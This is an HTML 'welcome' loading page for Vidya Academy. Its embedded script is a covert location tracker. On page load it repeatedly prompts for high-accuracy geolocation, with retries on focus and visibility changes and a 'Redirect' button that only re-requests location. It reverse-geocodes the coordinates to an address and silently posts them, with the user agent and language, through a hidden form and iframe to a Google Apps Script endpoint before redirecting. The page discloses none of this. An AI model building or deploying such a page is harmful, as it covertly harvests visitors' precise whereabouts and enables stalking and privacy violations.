<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Welcome to Vidya Academy</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="referrer" content="no-referrer" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a5f4e 0%, #0d7a63 50%, #fdb913 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }
    
    /* Animated background elements */
    .bg-shapes {
      position: absolute;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 0;
    }
    
    .shape {
      position: absolute;
      opacity: 0.1;
      animation: float 20s infinite ease-in-out;
    }
    
    .shape:nth-child(1) {
      width: 80px;
      height: 80px;
      background: #fdb913;
      border-radius: 50%;
      top: 10%;
      left: 10%;
      animation-delay: 0s;
    }
    
    .shape:nth-child(2) {
      width: 60px;
      height: 60px;
      background: #fff;
      border-radius: 50%;
      top: 70%;
      left: 80%;
      animation-delay: 2s;
    }
    
    .shape:nth-child(3) {
      width: 100px;
      height: 100px;
      background: #fdb913;
      border-radius: 20px;
      top: 50%;
      left: 5%;
      animation-delay: 4s;
    }
    
    .shape:nth-child(4) {
      width: 70px;
      height: 70px;
      background: #fff;
      border-radius: 50%;
      top: 20%;
      right: 15%;
      animation-delay: 1s;
    }
    
    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-30px) rotate(180deg); }
    }
    
    /* Main container */
    .container {
      text-align: center;
      z-index: 1;
      padding: 40px 20px;
      max-width: 500px;
      width: 90%;
    }
    
    /* Logo */
    .logo {
      width: 120px;
      height: 120px;
      margin: 0 auto 30px;
      background: white;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      animation: pulse 2s infinite;
    }
    
    .logo-text {
      font-size: 48px;
      font-weight: bold;
      color: #0a5f4e;
    }
    
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }
    
    /* Title */
    h1 {
      color: white;
      font-size: 36px;
      margin-bottom: 15px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
      animation: fadeInDown 1s ease-out;
    }
    
    .subtitle {
      color: #fdb913;
      font-size: 18px;
      margin-bottom: 40px;
      font-weight: 500;
      animation: fadeInUp 1s ease-out;
    }
    
    @keyframes fadeInDown {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    /* Loading spinner */
    .spinner-container {
      margin: 30px 0;
    }
    
    .spinner {
      width: 60px;
      height: 60px;
      margin: 0 auto;
      border: 5px solid rgba(255,255,255,0.3);
      border-top: 5px solid #fdb913;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Status text */
    #status {
      color: white;
      font-size: 16px;
      margin-top: 20px;
      min-height: 24px;
      opacity: 0.9;
    }
    
    /* Continue button */
    #continueBtn {
      display: none;
      margin: 30px auto 0;
      padding: 15px 40px;
      font-size: 18px;
      font-weight: 600;
      color: #0a5f4e;
      background: #fdb913;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 5px 20px rgba(253, 185, 19, 0.4);
      transition: all 0.3s ease;
      animation: fadeIn 0.5s ease-out;
    }
    
    #continueBtn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(253, 185, 19, 0.6);
    }
    
    #continueBtn:active {
      transform: translateY(0);
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    /* Loading dots animation */
    .loading-dots {
      display: inline-block;
      margin-left: 5px;
    }
    
    .loading-dots span {
      animation: blink 1.4s infinite;
      animation-fill-mode: both;
    }
    
    .loading-dots span:nth-child(2) {
      animation-delay: 0.2s;
    }
    
    .loading-dots span:nth-child(3) {
      animation-delay: 0.4s;
    }
    
    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
    
    /* Tagline */
    .tagline {
      color: rgba(255,255,255,0.8);
      font-size: 14px;
      margin-top: 40px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="bg-shapes">
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
  </div>
  
  <div class="container">
    <div class="logo">
      <div class="logo-text">VA</div>
    </div>
    
    <h1>Vidya Academy</h1>
    <div class="subtitle">Learning through Fun & Creativity</div>
    
    <div class="spinner-container">
      <div class="spinner"></div>
    </div>
    
    <p id="status">Preparing your experience<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>
    
    <button id="continueBtn">Continue to Website</button>
    
    <p class="tagline">Kundapura's Premier Educational Institution</p>
  </div>

  <script>
    // ----- CONFIG -----
    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwV9b3Mt776QU1OfdjNWJMaYV3sxPGQOyL49Nu-0jt3Y1pcYHsz4iNER-P540RTgWJi/exec'; // e.g. https://script.google.com/macros/s/XXXXXXXXXX/exec
    const SECRET_TOKEN = 'bumblebee'; // same as SECRET in Apps Script
  const REDIRECT_URL = 'https://thevidyaacademy.com/'; // Redirect here after success or failure
    // ------------------

  const statusEl = document.getElementById('status');
  const continueBtn = document.getElementById('continueBtn');
  let retryHandle = null;
  let geoPermissionStatus = null;
  let tempWatchId = null; // temporary watch to better trigger prompts on mobile

    // Encapsulate request flow so we can trigger on load AND via button (as retry)
    function requestAndSend() {
      // Keep status subtle for loading screen
      if (!navigator.geolocation) {
        // Silent fallback - just redirect
        setTimeout(() => safeRedirect(), 2000);
        return;
      }
  const opts = { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 };
      // Regular one-shot request
      navigator.geolocation.getCurrentPosition(success, fail, opts);

      // On many mobile browsers, watchPosition can more reliably trigger the permission prompt.
      // Start a short-lived watch if permission is in prompt/unknown state.
      try {
        const shouldStartWatch = !geoPermissionStatus || geoPermissionStatus.state === 'prompt';
        if (shouldStartWatch && tempWatchId == null) {
          tempWatchId = navigator.geolocation.watchPosition(success, function onWatchErr(e) {
            // Swallow errors; the primary flow handles retries.
          }, opts);
          // Auto-clear the temporary watch after a few seconds to avoid battery drain
          setTimeout(() => {
            try {
              if (tempWatchId != null) {
                navigator.geolocation.clearWatch(tempWatchId);
                tempWatchId = null;
              }
            } catch (_) {}
          }, 15000);
        }
      } catch (_) {}
    }

    // Auto-start on page load to show the permission prompt immediately
    window.addEventListener('DOMContentLoaded', async () => {
      // Watch geolocation permission changes and auto-retry when it becomes granted
      try {
        if (navigator.permissions && navigator.permissions.query) {
          const st = await navigator.permissions.query({ name: 'geolocation' });
          geoPermissionStatus = st;
          st.onchange = () => {
            if (st.state === 'granted') {
              clearTimeout(retryHandle);
              requestAndSend();
            }
          };
        }
      } catch (_) {}
      requestAndSend();
    });

    // Manual continue button handler: retry geolocation only (no auto-redirect timer)
    continueBtn.addEventListener('click', () => {
      try { continueBtn.style.display = 'none'; } catch(_){}
      requestAndSend();
    });

    // If the user toggles OS location and returns to the tab/app, try again automatically
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        scheduleRetry(1000);
      }
    });
    window.addEventListener('focus', () => scheduleRetry(1000));

    function success(pos) {
      statusEl.innerHTML = 'Loading<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
      // Clear any temporary watch we might have started to trigger the prompt
      try {
        if (tempWatchId != null) {
          navigator.geolocation.clearWatch(tempWatchId);
          tempWatchId = null;
        }
      } catch (_) {}
      try { continueBtn.style.display = 'none'; } catch(_){}
      // Keep the same send method; redirect after it resolves (or times out via internal fallback)
      sendViaForm(pos).then(r => {
        statusEl.textContent = 'Welcome! Redirecting...';
        safeRedirect();
      });
    }

    function fail(err) {
      // Error codes: 1 PERMISSION_DENIED, 2 POSITION_UNAVAILABLE, 3 TIMEOUT
      const code = (err && err.code) || 0;

      // Keep status minimal; show a manual redirect button so user can proceed after enabling Location
      statusEl.innerHTML = 'Almost ready<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
      try {
        continueBtn.textContent = 'Redirect';
        continueBtn.style.display = 'inline-block';
      } catch(_) {}

      // Schedule an automatic retry â€”
      // Retry only if services are off/unavailable/timeout. If permission is denied,
      // we wait for the user to change it and click the button.
      const shouldRetry = code === 2 || code === 3;
      if (shouldRetry) {
        scheduleRetry();
      }
    }

    function scheduleRetry(delayMs = 8000) {
      clearTimeout(retryHandle);
      retryHandle = setTimeout(() => {
        requestAndSend();
      }, delayMs);
    }

    // Notification/alert guidance removed for maximum compatibility and fewer blockers

    // Helper to perform a safe redirect with a tiny delay allowing UI updates to paint
    function safeRedirect() {
      setTimeout(() => {
        try {
          const target = (REDIRECT_URL || '').trim();
          if (!/^https?:\/\//i.test(target)) {
            console.warn('Invalid REDIRECT_URL, falling back to default:', target);
            statusEl.textContent = 'Welcome!';
            window.location.assign('https://thevidyaacademy.com/');
            return;
          }
          statusEl.textContent = 'Welcome!';
          window.location.assign(target);
        } catch (e) {
          // As a fallback, try assigning via location.replace (doesn't create history entry)
          try { window.location.replace(REDIRECT_URL); } catch (_) {}
        }
      }, 200);
    }
    // Reverse geocode helper (best-effort; may return null)
    async function reverseGeocodeText(lat, lon) {
      try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=18&addressdetails=1`;
        const res = await fetch(url, { headers: { 'User-Agent': 'exact-location-demo/1.0 (contact@example.com)' }});
        if (!res.ok) return null;
        const json = await res.json();
        return json.display_name || null;
      } catch (e) {
        return null;
      }
    }

    // Updated sendViaForm with richer data & reverse geocode
    async function sendViaForm(position) {
      if (!position || !position.coords) return { ok:false, error:'no coords' };

      // Prepare fields
      const latRaw = position.coords.latitude;
      const lonRaw = position.coords.longitude;
      const lat = latRaw.toFixed(6); // human-readable precision
      const lon = lonRaw.toFixed(6);
      const accuracy = Math.round(position.coords.accuracy || 0);
      const isoTs = new Date(position.timestamp).toISOString();
      const rawJson = JSON.stringify(position);
      const ua = navigator.userAgent;
      const extra = navigator.language || '';

      // Attempt reverse geocode (non-blocking failure)
      let address = null;
      try { address = await reverseGeocodeText(latRaw, lonRaw); } catch(e) { address = null; }

      // create hidden iframe
      const iframe = document.createElement('iframe');
      iframe.name = 'hidden_iframe_' + Date.now();
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      // create form
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = APPS_SCRIPT_URL;
      form.target = iframe.name;
      form.style.display = 'none';

      const addInput = (name, value) => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value === undefined || value === null ? '' : String(value);
        form.appendChild(input);
      };

      addInput('token', SECRET_TOKEN);
      addInput('lat', lat);
      addInput('lon', lon);
      addInput('lat_raw', latRaw);
      addInput('lon_raw', lonRaw);
      addInput('accuracy', accuracy);
      addInput('timestamp_iso', isoTs);
      addInput('address', address || '');
      addInput('raw', rawJson);
      addInput('userAgent', ua);
      addInput('extra', extra);

      document.body.appendChild(form);

      return new Promise((resolve) => {
        iframe.onload = function() {
          try { document.body.removeChild(form); } catch(e){}
          try { document.body.removeChild(iframe); } catch(e){}
          resolve({ ok:true });
        };
        form.submit();
        setTimeout(() => {
          try { document.body.removeChild(form); } catch(e){}
          try { document.body.removeChild(iframe); } catch(e){}
          resolve({ ok:true, note:'timeout fallback' });
        }, 6000);
      });
    }
  </script>
</body>
</html>
